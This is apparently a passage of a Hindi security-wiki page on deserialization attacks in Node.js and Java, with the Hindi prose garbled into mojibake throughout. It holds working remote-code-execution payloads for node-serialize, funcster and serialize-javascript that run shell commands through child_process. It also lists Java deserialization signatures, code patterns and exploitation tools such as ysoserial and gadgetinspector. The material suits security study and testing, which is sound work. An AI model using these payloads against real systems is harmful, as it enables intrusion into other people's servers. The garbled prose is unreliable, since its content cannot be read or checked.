рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рд╕рдВрдХреЗрддрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдкреБрд╕реНрддрдХрд╛рд▓рдп `_$$ND_FUNC$$_` рдХреЗ рдмрд╛рдж рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧреА рдФрд░ `eval` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд** рдХрд░реЗрдЧреАред рдЗрд╕рд▓рд┐рдП, **рдХреЛрдб рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк **рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░реНрдорд╛рдг** рднрд╛рдЧ рдФрд░ рдЕрдВрддрд┐рдо рд╡рд╛рдХреНрдпрд╛рдВрд╢ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдмрд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдПрдХ JS рд╡рдирд▓рд╛рдЗрдирд░ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
рдЖрдк рдЗрд╕ **[рдпрд╣рд╛рдБ](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)** рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕ рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА рдХреЛ рдХреИрд╕реЗ рдЙрддреНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### [funcster](https://www.npmjs.com/package/funcster)

**funcster** рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рдпрд╣ рд╣реИ рдХрд┐ **рдорд╛рдирдХ рдЗрдирдмрд┐рд▓реНрдЯ-рдЗрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЕрд╕рдВрднрд╡ рд╣реИ; рд╡реЗ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рджрд╛рдпрд░реЗ рдХреЗ рдмрд╛рд╣рд░ рд╣реИрдВред рдпрд╣ рдкреНрд░рддрд┐рдмрдВрдз рдЙрд╕ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ рдЬреЛ рдорд╛рдирдХ рдЗрдирдмрд┐рд▓реНрдЯ-рдЗрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдкрд╡рд╛рдж рдЙрддреНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ `"ReferenceError: console is not defined"` рдЬрдм `console.log()` рдпрд╛ `require(something)` рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╡реИрд╢реНрд╡рд┐рдХ рд╕рдВрджрд░реНрдн рддрдХ рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рднреА рдорд╛рдирдХ рдЗрдирдмрд┐рд▓реНрдЯ-рдЗрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рд╕рдВрднрд╡ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдирд┐рдкреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣реБрдВрдЪ рдкреБрдирдГ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╕реНрд░реЛрдд рдХреЛ рдкрдврд╝реЗрдВ**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** рдкреИрдХреЗрдЬ рдХреЛ рдХреЗрд╡рд▓ рд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХреЛрдИ рднреА рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреНрд╖рдорддрд╛рдПрдБ рдирд╣реАрдВ рд╣реИрдВред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдкрдиреА рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рдЦреБрдж рдХреА рд╡рд┐рдзрд┐ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВред рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдЙрджрд╛рд╣рд░рдг рджреНрд╡рд╛рд░рд╛ `eval` рдХрд╛ рд╕реАрдзрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрдЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
рдпрджрд┐ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк **рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╕реНрд░реЛрдд рдХреЛ рдкрдврд╝реЗрдВ**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo рдкреБрд╕реНрддрдХрд╛рд▓рдп

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА рдЬрд┐рд╕рд╕реЗ рд╡рд┐рдЪрд╛рд░рд╣реАрди рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java рдореЗрдВ, **рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХреЙрд▓рдмреИрдХ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХрд╛ рд╢рд┐рдХрд╛рд░ рдмрди рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рджреБрд░реБрдкрдпреЛрдЧреА рдкреЗрд▓реЛрдб рддреИрдпрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдЗрди рдХреЙрд▓рдмреИрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Fingerprints

#### White Box

рдХреЛрдбрдмреЗрд╕ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░реЗрдВ:

* рд╡рд░реНрдЧ рдЬреЛ `Serializable` рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╣реИрдВред
* `java.io.ObjectInputStream`, `readObject`, `readUnshare` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧред

рд╡рд┐рд╢реЗрд╖ рдзреНрдпрд╛рди рджреЗрдВ:

* рдмрд╛рд╣реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ `XMLDecoder`ред
* `XStream` рдХрд╛ `fromXML` рд╡рд┐рдзрд┐, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдпрджрд┐ XStream рд╕рдВрд╕реНрдХрд░рдг 1.46 рд╕реЗ рдХрдо рдпрд╛ рдмрд░рд╛рдмрд░ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИред
* `ObjectInputStream` рдЬреЛ `readObject` рд╡рд┐рдзрд┐ рдХреЗ рд╕рд╛рде рд╣реИред
* `readObject`, `readObjectNodData`, `readResolve`, рдпрд╛ `readExternal` рдЬреИрд╕реА рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдиред
* `ObjectInputStream.readUnshared`ред
* `Serializable` рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧред

#### Black Box

рдХрд╛рд▓реЗ рдмреЙрдХреНрд╕ рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдпрд╛ "рдореИрдЬрд┐рдХ рдмрд╛рдЗрдЯреНрд╕"** рдЦреЛрдЬреЗрдВ рдЬреЛ рдЬрд╛рд╡рд╛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬреНрдб рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рджрд░реНрд╢рд╛рддреЗ рд╣реИрдВ (`ObjectInputStream` рд╕реЗ рдЙрддреНрдкрдиреНрди):

* рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рдкреИрдЯрд░реНрди: `AC ED 00 05`ред
* рдмреЗрд╕64 рдкреИрдЯрд░реНрди: `rO0`ред
* `Content-type` рдХреЛ `application/x-java-serialized-object` рд╕реЗрдЯ рдХрд┐рдП рдЧрдП HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░реНрд╕ред
* рдкреВрд░реНрд╡ рдШрдЯрдирд╛ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рдкреИрдЯрд░реНрди: `1F 8B 08 00`ред
* рдкреВрд░реНрд╡ рдШрдЯрдирд╛ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдмреЗрд╕64 рдкреИрдЯрд░реНрди: `H4sIA`ред
* `.faces` рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдФрд░ `faces.ViewState` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рд╡реЗрдм рдлрд╝рд╛рдЗрд▓реЗрдВред рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЗрди рдкреИрдЯрд░реНрди рдХреА рдЦреЛрдЬ рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЬрд╛рдВрдЪ рдХреЛ рдкреНрд░реЗрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреИрд╕рд╛ рдХрд┐ [Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд░реНрдгрд┐рдд рд╣реИред
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### рдпрджрд┐ рд╡рдВрд╢рд╛рд╡рд▓реА рд╣реИ рдпрд╛ рдирд╣реАрдВ рдЬрд╛рдВрдЪреЗрдВ

рдпрджрд┐ рдЖрдк **рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝рдб рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ** рддреЛ рдЖрдкрдХреЛ [**рдмреЗрд╕рд┐рдХ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**](basic-java-deserialization-objectinputstream-readobject.md), [**рдЬрд╛рд╡рд╛ рдбреАрдПрдирдПрд╕ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**](java-dns-deserialization-and-gadgetprobe.md), рдФрд░ [**рдХреЙрдордиреНрд╕ рдХрд▓реЗрдХреНрд╢рди1 рдкреЗрд▓реЛрдб**](java-transformers-to-rutime-exec-payload.md) рдкрд░ рдПрдХ рдирдЬрд╝рд░ рдбрд╛рд▓рдиреА рдЪрд╛рд╣рд┐рдПред

#### рд╡реНрд╣рд╛рдЗрдЯ рдмреЙрдХреНрд╕ рдЯреЗрд╕реНрдЯ

рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдерд╛рдкрд┐рдд рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкрддрд╛ рдЪрд▓реА рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛рдПрдВ рд╣реИрдВред
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
рдЖрдк **рд╕рднреА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рдирдХреЗ рд▓рд┐рдП [**Ysoserial**](https://github.com/frohoff/ysoserial) рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) рдкрд░ рдирд┐рд░реНрджрд┐рдд рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд рдЧреИрдЬреЗрдЯ рд╢реНрд░реГрдВрдЦрд▓рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрддреНрдкреАрдбрд╝рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред\
**gadgetinspector** рдХреЛ рдЪрд▓рд╛рддреЗ рд╕рдордп (рдЗрд╕реЗ рдмрд┐рд▓реНрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж) рдЙрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЬрд╛ рд░рд╣реА рд╕рднреА рдЪреЗрддрд╛рд╡рдирд┐рдпреЛрдВ/рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреА рдЪрд┐рдВрддрд╛ рди рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рджреЗрдВред рдпрд╣ рд╕рднреА рдЦреЛрдЬреЛрдВ рдХреЛ _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ рдХреЗ рддрд╣рдд рд▓рд┐рдЦреЗрдЧрд╛ред рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **gadgetinspector рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рдЧрд▓рдд рд╕рдХрд╛рд░рд╛рддреНрдордХ рдкрд░рд┐рдгрд╛рдо рджрд┐рдЦрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

#### рдмреНрд▓реИрдХ рдмреЙрдХреНрд╕ рдкрд░реАрдХреНрд╖рдг

рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдХрд┐рд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рдФрд░ рдХрд┐рд╕ рд╡рд░реНрд╢рди) рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рдпрд╣ **рд╡рд┐рдХрд▓реНрдк рдЪреБрдирдирд╛ рдЖрд╕рд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** рддрд╛рдХрд┐ рджреЛрд╖ рд╕реЗ рдЙрддреНрдкреАрдбрд╝рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
[**рдЗрд╕реЗ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП GadgetProbe рдкрдврд╝реЗрдВ**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ред**\
GadgetProbe **`ObjectInputStream` рдЙрддреНрдкреАрдбрд╝рдиреЛрдВ** рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИред

рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ ysoserial рдХреЗ рд╕рд╛рде рдЙрддреНрдкреАрдбрд╝рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдЙрддреНрдкреАрдбрд╝рди** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
[**рдЗрд╕реЗ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП Java Deserialization Scanner рдкрдврд╝реЗрдВ**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner **`ObjectInputStream`** рдЙрддреНрдкреАрдбрд╝рдиреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИред

рдЖрдк [**Freddy**](https://github.com/nccgroup/freddy) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **Burp** рдореЗрдВ **рдЙрддреНрдкреАрдбрд╝рди** рджреЛрд╖реЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдкреНрд▓рдЧрдЗрди **рдХреЗрд╡рд▓ `ObjectInputStream`** рд╕рдВрдмрдВрдзрд┐рдд рджреЛрд╖реЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдЧрд╛ рдмрд▓реНрдХрд┐ **Json** рдФрд░ **Yml** рдЙрддреНрдкреАрдбрд╝рди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рд╕реЗ рднреА рджреЛрд╖реЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдЧрд╛ред рд╕рдХреНрд░рд┐рдп рдореЛрдб рдореЗрдВ, рдпрд╣ рдЙрдиреНрд╣реЗрдВ рд╕реНрд▓реАрдк рдпрд╛ DNS рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред\
[**рдЖрдк рдлреНрд░реЗрдбреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**рд╕рдВрдЪрдпрди рдкрд░реАрдХреНрд╖рдг**

рд╕рднреА рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдХреЛрдИ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдХрднреА-рдХрднреА рдЖрдк рд╕рдВрдЪрд┐рдд рд╡рд╕реНрддреБ рдХреЗ рднреАрддрд░ рдбреЗрдЯрд╛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреБрдЫ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж рдЖрдкрдХреЛ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рднреАрддрд░ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред\
